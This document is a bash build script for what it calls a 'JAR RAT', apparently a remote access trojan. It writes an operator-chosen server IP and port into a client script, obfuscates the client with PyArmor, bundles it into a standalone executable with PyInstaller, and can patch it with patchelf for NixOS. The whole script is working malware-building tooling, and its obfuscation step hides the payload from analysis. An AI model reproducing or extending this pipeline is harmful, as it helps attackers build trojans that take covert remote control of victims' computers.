#!/usr/bin/env bash
set -e

VENV_DIR="venv"
OBFUSCATED_DIR="obfuscated_client"
CLIENT_SCRIPT="client.py"
TEMP_CLIENT_SCRIPT="client_temp_build.py"
SPEC_TEMPLATE="client_base.spec"

echo "--- JAR RAT Build Script ---"

echo "[1/10] Cleaning previous build artifacts..."
rm -rf "$VENV_DIR" "$OBFUSCATED_DIR" dist/ build/ "$TEMP_CLIENT_SCRIPT"
echo "Cleaned."

echo "--- Client Configuration ---"
read -p "Enter Server IP (default: 127.0.0.1): " USER_SERVER_IP
if [ -z "$USER_SERVER_IP" ]; then
    USER_SERVER_IP="127.0.0.1"
fi
read -p "Enter Server Port (default: 9999): " USER_SERVER_PORT
if [ -z "$USER_SERVER_PORT" ]; then
    USER_SERVER_PORT="9999"
fi
echo "Client will connect to: $USER_SERVER_IP:$USER_SERVER_PORT"
echo "----------------------------"

echo "--- Output Executable Configuration ---"
read -p "Enter desired output executable name (default: client_obf): " USER_OUTPUT_NAME
if [ -z "$USER_OUTPUT_NAME" ]; then
    OUTPUT_NAME="client_obf"
else
    OUTPUT_NAME="$USER_OUTPUT_NAME"
fi
echo "Output executable will be named: $OUTPUT_NAME"
echo "-------------------------------------"

SPEC_FILE="${OUTPUT_NAME}.spec"
FINAL_EXECUTABLE="dist/$OUTPUT_NAME"
PYTHON_BIN="python3"

echo "[2/10] Creating virtual environment..."
"$PYTHON_BIN" -m venv "$VENV_DIR"
source "$VENV_DIR/bin/activate"
echo "Virtual environment created and activated."

echo "[3/10] Installing Python dependencies..."
pip install pyinstaller pyarmor.cli requests > /dev/null
echo "Dependencies installed."

echo "[4/10] Preparing client script with custom IP/Port..."
if [ ! -f "$CLIENT_SCRIPT" ]; then
    echo "Error: Client script '$CLIENT_SCRIPT' not found."
    if type deactivate &>/dev/null; then deactivate; fi
    exit 1
fi
cp "$CLIENT_SCRIPT" "$TEMP_CLIENT_SCRIPT"
if grep -q "SERVER_IP_PLACEHOLDER" "$TEMP_CLIENT_SCRIPT" && grep -q "SERVER_PORT_PLACEHOLDER" "$TEMP_CLIENT_SCRIPT"; then
    sed -i "s|DEFAULT_SERVER_IP = \"SERVER_IP_PLACEHOLDER\"|DEFAULT_SERVER_IP = \"${USER_SERVER_IP}\"|g" "$TEMP_CLIENT_SCRIPT"
    sed -i "s|DEFAULT_SERVER_PORT = SERVER_PORT_PLACEHOLDER|DEFAULT_SERVER_PORT = ${USER_SERVER_PORT}|g" "$TEMP_CLIENT_SCRIPT"
    echo "Client script configured."
else
    echo "Warning: IP/Port placeholders not found in '$CLIENT_SCRIPT'. Using as-is."
fi

echo "[5/10] Obfuscating client script with PyArmor..."
pyarmor gen --output "$OBFUSCATED_DIR" "$TEMP_CLIENT_SCRIPT" > /dev/null
echo "Client script obfuscated."

echo "[6/10] Verifying PyArmor runtime..."
PYARMOR_RUNTIME_FOLDER=$(find "$OBFUSCATED_DIR" -maxdepth 1 -type d -name "pyarmor_runtime_*" -print -quit)
if [ -z "$PYARMOR_RUNTIME_FOLDER" ]; then
    echo "Error: PyArmor runtime folder not found in '$OBFUSCATED_DIR'."
    if type deactivate &>/dev/null; then deactivate; fi; rm -f "$TEMP_CLIENT_SCRIPT"; exit 1
fi
PYARMOR_RUNTIME_BASENAME=$(basename "$PYARMOR_RUNTIME_FOLDER")
PYARMOR_SO_PATH="${PYARMOR_RUNTIME_FOLDER}/pyarmor_runtime.so"

if [ -f "$PYARMOR_SO_PATH" ]; then
    PYARMOR_SO_ELF_INFO=$(file -L -b "$PYARMOR_SO_PATH")
    if [[ "$PYARMOR_SO_ELF_INFO" == *"ELF 32-bit"* ]]; then
        echo "WARNING: PyArmor runtime ($PYARMOR_SO_PATH) detected as 32-BIT!"
        echo "         This will likely cause build errors or a non-functional executable on a 64-bit system."
    elif [[ "$PYARMOR_SO_ELF_INFO" == *"ELF 64-bit"* || "$PYARMOR_SO_ELF_INFO" == *"x86-64"* || "$PYARMOR_SO_ELF_INFO" == *"x86_64"* ]]; then
        echo "PyArmor runtime detected as 64-bit (Correct)."
    else
        echo "WARNING: Could not confirm PyArmor runtime architecture from output: '$PYARMOR_SO_ELF_INFO'."
    fi
else
    echo "Error: PyArmor runtime module (pyarmor_runtime.so) not found in '$PYARMOR_RUNTIME_FOLDER'."
    if type deactivate &>/dev/null; then deactivate; fi; rm -f "$TEMP_CLIENT_SCRIPT"; rm -rf "$OBFUSCATED_DIR"; exit 1
fi

echo "[7/10] Creating PyInstaller .spec file..."
if [ ! -f "$SPEC_TEMPLATE" ]; then
    echo "Error: Spec template file '$SPEC_TEMPLATE' not found."
    if type deactivate &>/dev/null; then deactivate; fi; rm -f "$TEMP_CLIENT_SCRIPT"; rm -rf "$OBFUSCATED_DIR"; exit 1
fi
OBFUSCATED_CLIENT_PATH_IN_SPEC="${OBFUSCATED_DIR}/${TEMP_CLIENT_SCRIPT}"
PYARMOR_DATA_SOURCE_IN_SPEC="${OBFUSCATED_DIR}/${PYARMOR_RUNTIME_BASENAME}"
sed -e "s|{{OBFUSCATED_CLIENT_PATH}}|${OBFUSCATED_CLIENT_PATH_IN_SPEC}|g" \
    -e "s|{{PYARMOR_DATA_SOURCE}}|${PYARMOR_DATA_SOURCE_IN_SPEC}|g" \
    -e "s|name='client_obf'|name='${OUTPUT_NAME}'|g" \
    "$SPEC_TEMPLATE" > "$SPEC_FILE"
echo ".spec file created: '$SPEC_FILE'"

echo "[8/10] Building final executable with PyInstaller..."
pyinstaller "$SPEC_FILE" > /dev/null
echo "Executable built in 'dist/' directory."

echo ""
while read -t 0.01 -n 1 discard_char; do :; done
read -p "Do you want to patch the executable for NixOS (y/N)? " -n 1 -r
echo

if [[ "$REPLY" =~ ^[Yy]$ ]]; then
    echo "[9/10] Patching executable for NixOS with patchelf..."
    if [ -x "$(command -v patchelf)" ] && [ -d "/nix/store" ] && [ -n "$NIX_CC" ]; then
        NIX_LD_PATH=$(cat "$NIX_CC/nix-support/dynamic-linker")
        NIX_LIBC_PATH=""
        NIX_ZLIB_PATH=""

        EXPECTED_LIBC_SO_PATH="$(dirname "$NIX_LD_PATH")/libc.so.6"
        if [ -f "$EXPECTED_LIBC_SO_PATH" ]; then
            LIBC_FILE_OUTPUT=$(file -L -b "$EXPECTED_LIBC_SO_PATH")
            if [[ "$LIBC_FILE_OUTPUT" == *"ELF 64-bit"* || "$LIBC_FILE_OUTPUT" == *"x86-64"* || "$LIBC_FILE_OUTPUT" == *"x86_64"* ]]; then
                NIX_LIBC_PATH=$(dirname "$EXPECTED_LIBC_SO_PATH")
            else
                echo "Warning: Candidate libc.so.6 ($EXPECTED_LIBC_SO_PATH) not identified as 64-bit."
            fi
        else
            echo "Warning: Main libc.so.6 not found at: $EXPECTED_LIBC_SO_PATH."
        fi

        FOUND_ZLIB_SO_PATH=""
        mapfile -t zlib_candidates < <(find -L /nix/store -maxdepth 5 -path '*/lib/libz.so.1' -type f -print 2>/dev/null)
        for candidate_zlib in "${zlib_candidates[@]}"; do
            if [ -f "$candidate_zlib" ]; then
                ZLIB_FILE_OUTPUT=$(file -L -b "$candidate_zlib")
                if [[ "$ZLIB_FILE_OUTPUT" == *"ELF 64-bit"* || "$ZLIB_FILE_OUTPUT" == *"x86-64"* || "$ZLIB_FILE_OUTPUT" == *"x86_64"* ]]; then
                    if [[ "$candidate_zlib" != *i686* && "$candidate_zlib" != *i386* ]]; then
                        FOUND_ZLIB_SO_PATH="$candidate_zlib"
                        break
                    fi
                fi
            fi
        done
        if [ -n "$FOUND_ZLIB_SO_PATH" ]; then
            NIX_ZLIB_PATH=$(dirname "$FOUND_ZLIB_SO_PATH")
        else
             echo "Warning: Failed to find a suitable 64-bit libz.so.1."
        fi

        if [ -n "$NIX_LD_PATH" ] && [ -n "$NIX_LIBC_PATH" ] && [ -n "$NIX_ZLIB_PATH" ] && [ -f "$FINAL_EXECUTABLE" ]; then
            echo "Patching $FINAL_EXECUTABLE with:"
            echo "  Interpreter: $NIX_LD_PATH"
            echo "  RPATH LibC:  $NIX_LIBC_PATH"
            echo "  RPATH ZLib:  $NIX_ZLIB_PATH"
            patchelf \
                --set-interpreter "$NIX_LD_PATH" \
                --add-rpath "$NIX_LIBC_PATH" \
                --add-rpath "$NIX_ZLIB_PATH" \
                "$FINAL_EXECUTABLE"
            echo "Executable patched successfully for NixOS."
            echo "NixOS Portability Note: This executable is specific to this machine's"
            echo "Nix store paths. It will certainly NOT RUN on other NixOS systems."
        else
            echo "Error: Patchelf failed. Necessary library paths not resolved or executable missing."
            echo "  LD Path: ${NIX_LD_PATH:-Not resolved}"
            echo "  LibC Dir: ${NIX_LIBC_PATH:-Not resolved}"
            echo "  ZLib Dir: ${NIX_ZLIB_PATH:-Not resolved}"
            echo "Your executable may not run correctly on NixOS."
        fi
    else
        echo "Warning: Not in a NixOS environment (or prerequisites missing). Patchelf skipped."
    fi
else
    echo "[9/10] NixOS patchelf skipped by user request."
fi

echo "[10/10] Finalizing build..."
if type deactivate &>/dev/null; then deactivate; fi
rm -f "$TEMP_CLIENT_SCRIPT" "$SPEC_FILE"
echo "Build process complete!"
echo "Executable is at: $FINAL_EXECUTABLE"
echo ""

